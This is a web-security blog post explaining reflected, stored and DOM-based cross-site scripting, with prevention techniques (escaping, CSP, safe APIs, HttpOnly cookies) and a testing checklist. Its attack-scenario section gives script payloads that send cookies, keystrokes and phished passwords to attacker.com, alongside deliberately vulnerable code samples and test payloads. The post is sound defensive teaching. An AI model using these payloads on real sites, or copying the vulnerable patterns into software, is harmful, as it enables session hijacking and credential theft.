+++
date = '2025-12-04T22:10:26-06:00'
draft = false
title = 'Cross-Site Scripting (XSS) Attacks Explained'
author = 'yad0'
tags = ['web-security', 'xss', 'javascript', 'vulnerabilities']
categories = ['Web Security']
+++

Cross-Site Scripting (XSS) is one of the most prevalent web application vulnerabilities. Let's dive into what XSS is, the different types, and how to defend against them.

## What is XSS?

XSS attacks occur when an attacker injects malicious scripts (usually JavaScript) into web pages viewed by other users. These scripts execute in the victim's browser context, potentially stealing data, hijacking sessions, or defacing websites.

## Types of XSS

### 1. Reflected XSS (Non-Persistent)

The malicious script comes from the current HTTP request. It's "reflected" back to the user.

**Example:**

```html
<!-- Vulnerable search functionality -->
<p>You searched for: <?php echo $_GET['query']; ?></p>
```

**Attack URL:**
```
https://vulnerable-site.com/search?query=<script>alert('XSS')</script>
```

### 2. Stored XSS (Persistent)

The malicious script is permanently stored on the target server (database, forum post, comment field).

**Example:**

```javascript
// Vulnerable comment system
const comment = userInput; // No sanitization
database.save(comment);

// Later displayed to all users
document.getElementById('comments').innerHTML = comment;
```

### 3. DOM-Based XSS

The vulnerability exists in client-side code rather than server-side.

**Example:**

```html
<script>
    // Vulnerable code
    const name = new URLSearchParams(window.location.search).get('name');
    document.getElementById('welcome').innerHTML = 'Hello ' + name;
</script>
```

**Attack:**
```
https://site.com/page?name=<img src=x onerror=alert('XSS')>
```

## Real-World Attack Scenarios

### Session Hijacking

```javascript
// Steal session cookies
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### Keylogging

```javascript
// Capture keystrokes
<script>
    document.addEventListener('keypress', function(e) {
        fetch('https://attacker.com/log?key=' + e.key);
    });
</script>
```

### Phishing

```javascript
// Inject fake login form
<script>
    document.body.innerHTML = '<form action="https://attacker.com/harvest">' +
        '<input name="username" placeholder="Username">' +
        '<input type="password" name="password" placeholder="Password">' +
        '<button>Login</button></form>';
</script>
```

## Prevention Techniques

### 1. Output Encoding/Escaping

**HTML Context:**

```javascript
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
```

**JavaScript Context:**

```javascript
// Use JSON.stringify for safe insertion
const userInput = JSON.stringify(untrustedData);
```

### 2. Content Security Policy (CSP)

Add CSP headers to restrict script sources:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' https://trusted-cdn.com">
```

**Or via HTTP header:**

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
```

### 3. Input Validation

```javascript
function validateInput(input) {
    // Whitelist approach
    const allowedPattern = /^[a-zA-Z0-9\s,.'-]+$/;
    return allowedPattern.test(input);
}

// Use it
if (!validateInput(userInput)) {
    throw new Error('Invalid input detected');
}
```

### 4. Use Safe APIs

```javascript
// DON'T use innerHTML with user data
element.innerHTML = userInput; // Dangerous!

// DO use textContent or innerText
element.textContent = userInput; // Safe

// Or use createElement
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);
```

### 5. HttpOnly Cookies

```javascript
// Set HttpOnly flag on sensitive cookies
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

## Framework-Specific Protection

### React

React automatically escapes content:

```jsx
// This is safe - React escapes by default
<div>{userInput}</div>

// This is dangerous - bypasses escaping
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

### Angular

Angular sanitizes content automatically:

```typescript
// Safe by default
<div>{{ userInput }}</div>

// Use DomSanitizer for trusted content
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

getTrustedHtml(html: string) {
    return this.sanitizer.sanitize(SecurityContext.HTML, html);
}
```

## Testing for XSS

**Basic Test Payloads:**

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<input onfocus=alert('XSS') autofocus>
```

**Tools:**

- **XSStrike**: Advanced XSS detection suite
- **Burp Suite**: Web vulnerability scanner
- **OWASP ZAP**: Free security testing tool

## XSS Testing Checklist

- [ ] Test all input fields (forms, search boxes, URL parameters)
- [ ] Check file upload functionality
- [ ] Test HTTP headers (User-Agent, Referer)
- [ ] Examine cookie values
- [ ] Review API endpoints
- [ ] Test DOM manipulation
- [ ] Verify CSP implementation

## Key Takeaways

1. **Never trust user input** - Always sanitize and validate
2. **Use context-aware encoding** - Different contexts need different encoding
3. **Implement CSP** - Defense in depth approach
4. **Use framework protections** - Don't bypass built-in security
5. **Set HttpOnly flags** - Protect sensitive cookies
6. **Regular security audits** - Test your applications

## Conclusion

XSS vulnerabilities can have serious consequences, from stolen credentials to complete account takeover. The good news is that modern frameworks provide built-in protection, and following security best practices can prevent most XSS attacks.

Remember: defense in depth is key. Combine multiple protection layers for robust security.
